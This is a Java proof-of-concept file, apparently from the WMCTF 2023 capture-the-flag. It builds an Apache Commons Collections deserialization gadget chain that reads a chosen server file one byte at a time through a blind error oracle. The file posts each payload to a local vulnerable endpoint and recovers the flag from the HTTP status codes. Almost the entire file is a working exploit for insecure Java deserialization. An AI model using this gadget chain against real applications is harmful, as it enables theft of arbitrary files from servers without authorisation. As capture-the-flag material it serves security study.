package com.javasec.pocs.wmctf2023;
import com.javasec.utils.SerializeUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import java.io.DataOutputStream;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.*;

public class CCBlindFileInject {
    public static void main(String[] args) throws Exception {
        guess("http://127.0.0.1:8080/vul","/E:\\1.txt");
    }
    public static void guess(String address,String filename) throws Exception {
        String strs="abcdefghijklmnopqrstuvwxyz_{}ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        boolean symbol=true;
        int index=0;
        String flag="";
        while(symbol){
            System.out.println(String.format("[*]start to guess %d place",index));
            for (char c : strs.toCharArray()) {
                Hashtable hashtable = generateChain(index, c,filename);
                String expbase64 = SerializeUtils.base64serial(hashtable);
                try {
                    String poc = String.format("exp=%s", URLEncoder.encode(expbase64, "UTF-8"));
                    int status = doPostWithParams(poc, address);
                    if (status == 200) {
                        if(c=='}'){
                            symbol=false;
                        }
                        flag += c;
                        System.out.println(String.format("[*]flag is: %s",flag));
                        index++;
                        break;
                    }
                }catch (Exception e){

                }
            }
        }
    }
    public static Hashtable generateChain(int index, char guesscode,String filename) throws Exception{
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        ConstantTransformer useless = new ConstantTransformer("void");
        Map lazyMap1 = LazyMap.decorate(innerMap1,useless);
        lazyMap1.put("yy", 1);
        Map lazyMap2 = LazyMap.decorate(innerMap2,useless);
        lazyMap2.put("zZ", 1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);
        List<Transformer> transformerList =new ArrayList<>();
        transformerList.add(new ConstantTransformer(new URL(String.format("file://%s",filename))));
        transformerList.add(new InvokerTransformer("openConnection", null, null));
        transformerList.add(new InvokerTransformer("getInputStream",null,null));
        transformerList.add(new ClosureTransformer(new ForClosure(
                index,new TransformerClosure(new InvokerTransformer("read",null,null))
        )));
        transformerList.add(new InvokerTransformer("read",null,null));
        transformerList.add(new ClosureTransformer(new IfClosure(
                new EqualPredicate((int)guesscode),
                NOPClosure.getInstance(),
                ExceptionClosure.getInstance()
        )));
        Collections.reverse(transformerList);
        Map padding = new HashMap();
        padding.put("zZ",1);
        Map<?, ?> transformerMap = transformerList.stream().reduce(padding, (acc, transformer) -> {
            return TransformedMap.decorate(acc, null, transformer);
        }, (m1, m2) -> {
            throw new UnsupportedOperationException("Parallel execution not supported");
        });

        Field f = lazyMap2.getClass().getSuperclass().getDeclaredField("map");
        f.setAccessible(true);
        f.set(lazyMap2, transformerMap);
        return hashtable;
    }
    public static int doPostWithParams(String params, String address) throws Exception{
            URL urlObj = new URL(address);
            HttpURLConnection connection = (HttpURLConnection) urlObj.openConnection();

            connection.setRequestMethod("POST");
            connection.setDoOutput(true); // 允许写入 POST 数据
            try (DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream())) {
                outputStream.writeBytes(params);
                outputStream.flush();
            }

            int responseCode = connection.getResponseCode();
            return responseCode;
    }
}
